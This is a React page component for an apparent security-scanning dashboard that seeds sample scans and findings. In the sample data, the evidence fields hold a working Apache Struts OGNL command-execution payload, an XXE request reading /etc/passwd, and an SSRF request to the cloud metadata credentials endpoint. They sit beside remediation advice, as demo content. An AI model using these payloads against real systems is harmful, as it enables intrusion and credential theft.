
import React, { useState, useEffect } from "react";
import { Scan } from "@/api/entities";
import { Customer } from "@/api/entities";
import { ScanResult } from "@/api/entities"; // New import for ScanResult
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import {
  ArrowLeft,
  AlertTriangle,
  Activity,
  CheckCircle2,
  XCircle,
  Search,
  Clock,
  Building2,
  Filter,
  Plus, // Added for the new button
  Server // Added for node information in detail view
} from "lucide-react";
import { useNavigate } from "react-router-dom";
import { createPageUrl } from "@/utils";
import { format, differenceInHours, differenceInDays } from "date-fns";

// New import for the external ScanDetailDialog component
import ScanDetailDialog from "../components/diagnostic/ScanDetailDialog";

export default function Diagnostic() {
  const navigate = useNavigate();
  const [scans, setScans] = useState([]);
  const [customers, setCustomers] = useState({});
  const [loading, setLoading] = useState(true);
  const [showLongRunning, setShowLongRunning] = useState(false);
  const [searchQuery, setSearchQuery] = useState("");
  const [selectedScan, setSelectedScan] = useState(null);
  const [showScanDetail, setShowScanDetail] = useState(false);

  useEffect(() => {
    loadData();
  }, []);

  const loadData = async () => {
    setLoading(true);
    try {
      const scansData = await Scan.list("-started_at");
      setScans(scansData);

      const customersData = await Customer.list();
      const customersMap = {};
      customersData.forEach(c => {
        customersMap[c.id] = c;
      });
      setCustomers(customersMap);
    } catch (error) {
      console.error("Error loading diagnostic data:", error);
    }
    setLoading(false);
  };

  const handleAddSampleScans = async () => {
    const customersList = Object.values(customers);
    if (customersList.length === 0) {
      alert("Please add customers first before creating sample scans.");
      return;
    }

    try {
      // Use first 3 customers or repeat if less than 3
      const customer1 = customersList[0].id;
      const customer2 = customersList[Math.min(1, customersList.length - 1)].id;
      const customer3 = customersList[Math.min(2, customersList.length - 1)].id;

      const scans = await Scan.bulkCreate([
        {
          customer_id: customer1,
          scan_name: "Production Infrastructure Scan",
          scan_type: "Infrastructure",
          status: "running",
          started_at: new Date(Date.now() - 86400000 * 2).toISOString(), // 2 days ago (long running)
          progress: 45,
          targets_count: 120,
          vulnerabilities_found: 15,
          node_name: "scan-node-us-east-1",
          node_location: "US-East (Virginia)",
          node_ip: "54.123.45.67"
        },
        {
          customer_id: customer2,
          scan_name: "Web Application Security Test",
          scan_type: "Web Application",
          status: "running",
          started_at: new Date(Date.now() - 7200000).toISOString(), // 2 hours ago
          progress: 78,
          targets_count: 15,
          vulnerabilities_found: 6,
          node_name: "scan-node-eu-west-1",
          node_location: "EU-West (Ireland)",
          node_ip: "52.210.98.123"
        },
        {
          customer_id: customer3,
          scan_name: "Cloud Assets Audit",
          scan_type: "Cloud",
          status: "running",
          started_at: new Date(Date.now() - 86400000 * 1.5).toISOString(), // 1.5 days ago (long running)
          progress: 32,
          targets_count: 85,
          vulnerabilities_found: 12,
          node_name: "scan-node-us-west-2",
          node_location: "US-West (Oregon)",
          node_ip: "44.234.12.89"
        },
        {
          customer_id: customer1,
          scan_name: "External Perimeter Scan",
          scan_type: "External",
          status: "completed",
          started_at: new Date(Date.now() - 10800000).toISOString(), // 3 hours ago
          completed_at: new Date(Date.now() - 3600000).toISOString(), // 1 hour ago
          progress: 100,
          targets_count: 45,
          vulnerabilities_found: 23,
          node_name: "scan-node-us-east-1",
          node_location: "US-East (Virginia)",
          node_ip: "54.123.45.67"
        },
        {
          customer_id: customer2,
          scan_name: "Internal Network Assessment",
          scan_type: "Internal",
          status: "running",
          started_at: new Date(Date.now() - 3600000).toISOString(), // 1 hour ago
          progress: 22,
          targets_count: 200,
          vulnerabilities_found: 3,
          node_name: "scan-node-ap-southeast-1",
          node_location: "Asia Pacific (Singapore)",
          node_ip: "13.229.87.45"
        },
        {
          customer_id: customer3,
          scan_name: "Weekly Compliance Check",
          scan_type: "Compliance",
          status: "failed",
          started_at: new Date(Date.now() - 5 * 86400000).toISOString(), // 5 days ago
          completed_at: new Date(Date.now() - 4 * 86400000).toISOString(), // 4 days ago
          progress: 100,
          targets_count: 50,
          vulnerabilities_found: 5,
          node_name: "scan-node-eu-central-1",
          node_location: "EU-Central (Frankfurt)",
          node_ip: "18.192.34.56"
        }
      ]);

      // Add sample results for each scan
      const scan1Results = [
        {
          scan_id: scans[0].id,
          vulnerability_name: "Remote Code Execution via Deserialization",
          vulnerability_code: "CVE-2024-1234",
          severity: "critical",
          target: "10.0.1.15",
          port: "8080",
          description: "Apache Struts vulnerable to remote code execution through unsafe deserialization of user-supplied data.",
          evidence: "POST /struts2-showcase/employee/save.action\nContent-Type: application/x-www-form-urlencoded\n\nname=%{(#_='multipart/form-data').(#[email protected]@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",
          recommendation: "Immediately update Apache Struts to version 2.5.33 or later. Implement input validation and sanitization. Use a Web Application Firewall (WAF) to filter malicious requests. Disable dynamic method invocation if not required.",
          cvss_score: 10.0,
          status: "new"
        },
        {
          scan_id: scans[0].id,
          vulnerability_name: "SMB Signing Not Required",
          vulnerability_code: "CWE-300",
          severity: "high",
          target: "10.0.1.50",
          port: "445",
          description: "SMB server does not require packet signing, making it vulnerable to man-in-the-middle attacks and session hijacking.",
          evidence: "Nmap scan report for 10.0.1.50\nPORT    STATE SERVICE\n445/tcp open  microsoft-ds\n\nHost script results:\n| smb2-security-mode:\n|   2:1:0:\n|_    Message signing enabled but not required\n| smb-security-mode:\n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled",
          recommendation: "Enable SMB signing requirement in Group Policy. Configure 'Microsoft network server: Digitally sign communications (always)' to 'Enabled'. Update SMB protocol to SMBv3. Disable SMBv1 if still enabled.",
          cvss_score: 7.5,
          status: "new"
        },
        {
          scan_id: scans[0].id,
          vulnerability_name: "Exposed Redis Instance Without Authentication",
          vulnerability_code: "CWE-306",
          severity: "critical",
          target: "10.0.1.200",
          port: "6379",
          description: "Redis database is exposed to the network without authentication, allowing unauthorized access to cached data and potential server compromise.",
          evidence: "$ redis-cli -h 10.0.1.200\n10.0.1.200:6379> AUTH\n(error) ERR Client sent AUTH, but no password is set\n10.0.1.200:6379> INFO\n# Server\nredis_version:5.0.7\nredis_mode:standalone\nos:Linux 4.15.0-112-generic x86_64\n\n10.0.1.200:6379> KEYS *\n1) \"session:user:12345\"\n2) \"cache:api:tokens\"\n3) \"user:passwords:hash\"",
          recommendation: "Enable Redis authentication by setting 'requirepass' in redis.conf. Bind Redis to localhost (127.0.0.1) if external access is not needed. Use firewall rules to restrict access. Enable SSL/TLS for Redis connections. Regularly update Redis to the latest version.",
          cvss_score: 9.8,
          status: "new"
        }
      ];

      const scan2Results = [
        {
          scan_id: scans[1].id,
          vulnerability_name: "Server-Side Request Forgery (SSRF)",
          vulnerability_code: "CWE-918",
          severity: "high",
          target: "webapp.example.com",
          port: "443",
          description: "Application allows users to specify URLs that are fetched by the server, enabling SSRF attacks to access internal services.",
          evidence: "POST /api/fetch-url\n{\n  \"url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"\n}\n\nResponse:\n{\n  \"success\": true,\n  \"content\": \"ec2-role-web-server\\n\",\n  \"status_code\": 200\n}",
          recommendation: "Implement a whitelist of allowed domains and protocols. Validate and sanitize all user-supplied URLs. Use a dedicated service for URL fetching with restricted network access. Disable unnecessary URL schemes (file://, gopher://, etc.).",
          cvss_score: 8.6,
          status: "new"
        },
        {
          scan_id: scans[1].id,
          vulnerability_name: "XML External Entity (XXE) Injection",
          vulnerability_code: "CWE-611",
          severity: "high",
          target: "api.example.com",
          port: "443",
          description: "XML parser processes external entities without proper restriction, allowing file disclosure and SSRF attacks.",
          evidence: 'POST /api/parse-xml\nContent-Type: application/xml\n\n<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ELEMENT foo ANY>\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<foo>&xxe;</foo>\n\nResponse:\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n...',
          recommendation: "Disable external entity processing in XML parsers. Use secure parser configurations (e.g., disallow DOCTYPE declarations). Validate and sanitize XML input. Use JSON instead of XML where possible. Update XML processing libraries.",
          cvss_score: 8.2,
          status: "new"
        }
      ];

      const scan3Results = [
        {
          scan_id: scans[2].id,
          vulnerability_name: "S3 Bucket Publicly Accessible",
          vulnerability_code: "CWE-732",
          severity: "critical",
          target: "s3://company-backups",
          port: "443",
          description: "AWS S3 bucket is configured with public read access, exposing sensitive backup files to the internet.",
          evidence: "aws s3 ls s3://company-backups --no-sign-request\n\n2024-01-15 10:30:25  524288000 database-backup-2024-01-15.sql\n2024-01-14 10:30:25  518144000 database-backup-2024-01-14.sql\n2024-01-13 10:30:25  512000000 database-backup-2024-01-13.sql\n2024-01-15 14:20:10   1048576 customer-pii-export.csv\n2024-01-10 09:15:30   2097152 api-keys-backup.txt",
          recommendation: "Immediately remove public access from the S3 bucket. Enable S3 Block Public Access at both bucket and account level. Implement bucket policies with least privilege access. Enable S3 bucket logging and CloudTrail. Use S3 encryption for data at rest.",
          cvss_score: 9.1,
          status: "new"
        },
        {
          scan_id: scans[2].id,
          vulnerability_name: "IAM User with Overly Permissive Permissions",
          vulnerability_code: "CWE-269",
          severity: "high",
          target: "arn:aws:iam::123456789:user/dev-user",
          port: "N/A",
          description: "IAM user has AdministratorAccess policy attached, violating the principle of least privilege.",
          evidence: "aws iam list-attached-user-policies --user-name dev-user\n{\n  \"AttachedPolicies\": [\n    {\n      \"PolicyName\": \"AdministratorAccess\",\n      \"PolicyArn\": \"arn:aws:iam::aws:policy/AdministratorAccess\"\n    }\n]\n}\n\nUser Last Activity: 2024-01-20 15:30:00\nPassword Last Used: Never\nAccess Key Age: 847 days",
          recommendation: "Replace AdministratorAccess with specific, limited permissions based on actual needs. Implement MFA for all IAM users. Regularly audit IAM permissions. Rotate access keys every 90 days. Use IAM roles instead of long-lived credentials where possible.",
          cvss_score: 7.7,
          status: "new"
        }
      ];

      await ScanResult.bulkCreate([...scan1Results, ...scan2Results, ...scan3Results]);

      await loadData();
    } catch (error) {
      console.error("Error creating sample scans:", error);
      alert("Error creating sample scans. Please try again.");
    }
  };

  // Helper function moved inside component for self-containment
  const getDuration = (startedAt) => {
    if (!startedAt) return "N/A";
    const hours = differenceInHours(new Date(), new Date(startedAt));
    const days = differenceInDays(new Date(), new Date(startedAt));

    if (days > 0) {
      return `${days} day${days > 1 ? 's' : ''} ${hours % 24}h`;
    }
    return `${hours}h`;
  };

  // Helper function moved inside component for self-containment
  const getStatusColor = (status) => {
    switch (status) {
      case 'running':
      case 'online': return 'bg-blue-500/20 text-blue-300';
      case 'completed': return 'bg-green-500/20 text-green-300';
      case 'failed':
      case 'offline':
      case 'error': return 'bg-red-500/20 text-red-300';
      case 'queued': return 'bg-yellow-500/20 text-yellow-300';
      default: return 'bg-gray-500/20 text-gray-300';
    }
  };

  const runningScans = scans.filter(s => s.status === "running");

  const longRunningScans = runningScans.filter(s => {
    if (!s.started_at) return false;
    const hours = differenceInHours(new Date(), new Date(s.started_at));
    return hours >= 24;
  });

  const filteredScans = (showLongRunning ? longRunningScans : runningScans).filter(scan => {
    const customer = customers[scan.customer_id];
    const searchLower = searchQuery.toLowerCase();
    return (
      scan.scan_name.toLowerCase().includes(searchLower) ||
      customer?.company_name?.toLowerCase().includes(searchLower) ||
      scan.scan_type.toLowerCase().includes(searchLower)
    );
  });

  // Handler for opening scan detail dialog
  const handleScanClick = (scan) => {
    setSelectedScan(scan);
    setShowScanDetail(true);
  };

  const stats = [
    {
      label: "Running Scans",
      value: runningScans.length,
      icon: Activity,
      color: "#F4B942",
      onClick: () => setShowLongRunning(false)
    },
    {
      label: "Running > 24h",
      value: longRunningScans.length,
      icon: AlertTriangle,
      color: longRunningScans.length > 0 ? "#F49342" : "#4CAF50",
      onClick: () => setShowLongRunning(true)
    },
    {
      label: "Completed Today",
      value: scans.filter(s => {
        if (s.status !== 'completed' || !s.completed_at) return false;
        const hours = differenceInHours(new Date(), new Date(s.completed_at));
        return hours < 24;
      }).length,
      icon: CheckCircle2,
      color: "#4CAF50"
    },
    {
      label: "Failed Today",
      value: scans.filter(s => {
        if (s.status !== 'failed' || !s.completed_at) return false;
        const hours = differenceInHours(new Date(), new Date(s.completed_at));
        return hours < 24;
      }).length,
      icon: XCircle,
      color: "#F49342"
    }
  ];

  return (
    <div className="min-h-screen p-6" style={{ backgroundColor: '#0A4A52' }}>
      <div className="max-w-7xl mx-auto">
        <div className="flex items-center justify-between mb-8">
          <div className="flex items-center gap-4">
            <Button
              variant="outline"
              size="icon"
              onClick={() => navigate(createPageUrl("Tools"))}
              className="border-[#176B7A]"
              style={{ backgroundColor: '#176B7A', color: '#E8F4F5' }}
            >
              <ArrowLeft className="w-4 h-4" />
            </Button>
            <div>
              <h1 className="text-3xl font-bold mb-2" style={{ color: '#E8F4F5' }}>
                Diagnostic Overview
              </h1>
              <p style={{ color: '#7FB8BF' }}>
                Monitor running scans and system health
              </p>
            </div>
          </div>

          {scans.length === 0 && (
            <Button
              onClick={handleAddSampleScans}
              className="bg-[#F4B942] hover:bg-[#F49342] text-[#0A4A52]"
            >
              <Plus className="w-4 h-4 mr-2" />
              Add Sample Scans
            </Button>
          )}
        </div>

        {/* Stats */}
        <div className="grid grid-cols-1 md:grid-cols-4 gap-6 mb-8">
          {stats.map((stat, index) => (
            <Card
              key={index}
              className={`border-0 shadow-lg ${stat.onClick ? 'cursor-pointer hover:shadow-xl' : ''} transition-all`}
              style={{ backgroundColor: '#176B7A' }}
              onClick={stat.onClick}
            >
              <CardContent className="p-6">
                <div className="flex justify-between items-start mb-4">
                  <p className="text-sm" style={{ color: '#A3CED1' }}>{stat.label}</p>
                  <div
                    className="p-2 rounded-lg"
                    style={{ backgroundColor: 'rgba(244, 185, 66, 0.15)' }}
                  >
                    <stat.icon className="w-5 h-5" style={{ color: stat.color }} />
                  </div>
                </div>
                <p className="text-4xl font-bold" style={{ color: stat.color }}>
                  {stat.value}
                </p>
              </CardContent>
            </Card>
          ))}
        </div>

        {/* Search and Filter */}
        <Card className="border-0 shadow-lg mb-6" style={{ backgroundColor: '#176B7A' }}>
          <CardContent className="p-6">
            <div className="flex flex-col md:flex-row gap-4">
              <div className="flex-1 relative">
                <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 w-5 h-5" style={{ color: '#7FB8BF' }} />
                <Input
                  placeholder="Search scans by name, customer, or type..."
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  className="pl-10 border-0"
                  style={{
                    backgroundColor: '#1E8A9C',
                    color: '#E8F4F5'
                  }}
                />
              </div>
              <Button
                variant="outline"
                onClick={() => setShowLongRunning(!showLongRunning)}
                className={`border-[#F4B942] ${showLongRunning ? 'bg-[#F4B942] text-[#0A4A52]' : ''}`}
                style={{ color: showLongRunning ? '#0A4A52' : '#F4B942' }}
              >
                <Filter className="w-4 h-4 mr-2" />
                {showLongRunning ? "Show All Running" : "Show Long Running Only"}
              </Button>
            </div>
          </CardContent>
        </Card>

        {/* Scans List */}
        <Card className="border-0 shadow-lg" style={{ backgroundColor: '#176B7A' }}>
          <CardHeader className="border-b" style={{ borderColor: '#1E8A9C' }}>
            <CardTitle style={{ color: '#E8F4F5' }}>
              {showLongRunning ? `Long Running Scans (${filteredScans.length})` : `Running Scans (${filteredScans.length})`}
            </CardTitle>
          </CardHeader>
          <CardContent className="p-0">
            {loading ? (
              <div className="p-12 text-center">
                <div className="animate-spin rounded-full h-12 w-12 border-b-2 mx-auto mb-4" style={{ borderColor: '#F4B942' }} />
                <p style={{ color: '#E8F4F5' }}>Loading scans...</p>
              </div>
            ) : filteredScans.length === 0 ? (
              <div className="p-12 text-center">
                <Activity className="w-16 h-16 mx-auto mb-4" style={{ color: '#7FB8BF' }} />
                <p className="text-xl mb-2" style={{ color: '#E8F4F5' }}>
                  {showLongRunning ? "No long running scans" : "No running scans"}
                </p>
                <p style={{ color: '#7FB8BF' }}>
                  {showLongRunning
                    ? "All scans are running smoothly"
                    : "No scans are currently in progress"}
                </p>
              </div>
            ) : (
              <div className="divide-y" style={{ borderColor: '#1E8A9C' }}>
                {filteredScans.map((scan, index) => {
                  const customer = customers[scan.customer_id];
                  const duration = getDuration(scan.started_at);
                  const isLongRunning = scan.started_at &&
                    differenceInHours(new Date(), new Date(scan.started_at)) >= 24;

                  return (
                    <div
                      key={index}
                      className="p-6 hover:bg-[#1E8A9C] transition-colors cursor-pointer"
                      onClick={() => handleScanClick(scan)}
                    >
                      <div className="flex flex-col md:flex-row justify-between gap-4">
                        <div className="flex-1">
                          <div className="flex items-center gap-3 mb-2 flex-wrap">
                            <h3 className="font-semibold text-lg" style={{ color: '#E8F4F5' }}>
                              {scan.scan_name}
                            </h3>
                            <Badge
                              variant="outline"
                              className={`border-0 ${getStatusColor(scan.status)}`}
                            >
                              {scan.status}
                            </Badge>
                            <Badge variant="outline" className="border-0 bg-purple-500/20 text-purple-300">
                              {scan.scan_type}
                            </Badge>
                            {isLongRunning && (
                              <Badge variant="outline" className="border-0 bg-orange-500/20 text-orange-300">
                                <AlertTriangle className="w-3 h-3 mr-1" />
                                Long Running
                              </Badge>
                            )}
                          </div>

                          <div className="space-y-1 text-sm" style={{ color: '#A3CED1' }}>
                            {customer && (
                              <div className="flex items-center gap-2">
                                <Building2 className="w-4 h-4" />
                                <span className="font-semibold">{customer.company_name}</span>
                              </div>
                            )}
                            {scan.started_at && (
                              <div className="flex items-center gap-2">
                                <Clock className="w-4 h-4" />
                                Started {format(new Date(scan.started_at), "MMM d, yyyy 'at' HH:mm")}
                              </div>
                            )}
                            {scan.targets_count > 0 && (
                              <p>Scanning {scan.targets_count} targets</p>
                            )}
                          </div>
                        </div>

                        <div className="flex flex-col items-end justify-between gap-2">
                          <div className="text-right">
                            <p className="text-sm mb-1" style={{ color: '#7FB8BF' }}>Duration</p>
                            <p className="text-2xl font-bold" style={{
                              color: isLongRunning ? '#F49342' : '#F4B942'
                            }}>
                              {duration}
                            </p>
                          </div>

                          {scan.progress > 0 && (
                            <div className="text-right">
                              <p className="text-sm" style={{ color: '#7FB8BF' }}>Progress</p>
                              <p className="font-semibold" style={{ color: '#E8F4F5' }}>
                                {scan.progress}%
                              </p>
                            </div>
                          )}
                        </div>
                      </div>
                    </div>
                  );
                })}
              </div>
            )}
          </CardContent>
        </Card>
      </div>

      {/* Scan Detail Dialog */}
      <ScanDetailDialog
        open={showScanDetail}
        onOpenChange={setShowScanDetail}
        scan={selectedScan}
        customer={selectedScan ? customers[selectedScan.customer_id] : null}
      />
    </div>
  );
}
